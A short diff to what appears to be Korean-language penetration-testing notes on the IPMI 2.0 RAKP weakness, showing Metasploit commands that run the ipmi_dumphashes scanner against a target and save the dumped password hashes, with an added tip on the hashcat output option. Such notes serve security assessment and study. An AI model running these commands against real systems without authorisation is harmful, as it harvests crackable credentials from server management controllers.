@@ -68,7 +68,7 @@ IPMI 2.0 의 RAKP 프로토콜은 유효한 사용자명에 대해 비밀번호�
 msfconsole -q
 msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
 msf6 > set RHOSTS <IP>
-msf6 > set OUTPUT_FILE ipmi.hash       # 해시를 파일로 저장
+msf6 > set OUTPUT_FILE ipmi.hash       # 해시를 파일로 저장 (Unknown datastore option 뜰 경우 OUTPUT_HASHCAT_FILE로 지정)
 msf6 > run
 
 # 세부 옵션은 콘솔에서 직접 확인 (사용자/비번 사전 등)
